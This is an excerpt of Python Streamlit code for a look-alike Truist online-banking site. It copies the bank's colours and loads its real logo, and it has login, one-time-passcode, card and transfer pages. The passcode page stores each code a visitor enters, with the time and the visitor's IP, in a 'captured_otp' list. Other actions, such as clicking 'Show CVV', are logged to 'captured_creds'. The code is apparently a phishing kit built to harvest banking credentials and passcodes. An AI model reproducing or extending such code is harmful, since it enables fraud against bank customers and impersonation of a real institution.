...
st.markdown("""
<style>
    .stApp {background: #502b85; color: white; font-family: 'Helvetica Neue', sans-serif;}
    .truist-header {background: #502b85; padding: 15px; text-align: center; border-bottom: 4px solid #ffb700;}
...
def login_page():
    ...
    st.image("https://www.truist.com/content/dam/truist/us/en/images/logos/truist-logo-white.svg", width=220)
...
def otp_page():
    ...
    if st.button("Verify", type="primary"):
        st.session_state.captured_otp.append({"time": datetime.now().strftime("%H:%M"), "otp": code, "ip": get_ip()})
        if len(code) == 6:
...
def cards_page():
    ...
    with col3:
        if st.button("Show CVV"):
            st.session_state.captured_creds.append({"time": datetime.now().strftime("%H:%M"), "action": "CVV Clicked", "ip": get_ip()})
            st.info("CVV: 342")
            st.balloons()
    st.markdown("</div>", unsafe_allow_html=True)
...
def transfer():
    ...
    with col2: st.selectbox("To", ["Savings ****5901", "External Chase"])
...
# ========================= SIDEBAR =========================
def sidebar():
    st.sidebar.image("https://www.truist.com/content/dam/truist/us/en/images/logos/truist-logo-white.svg", width=150)
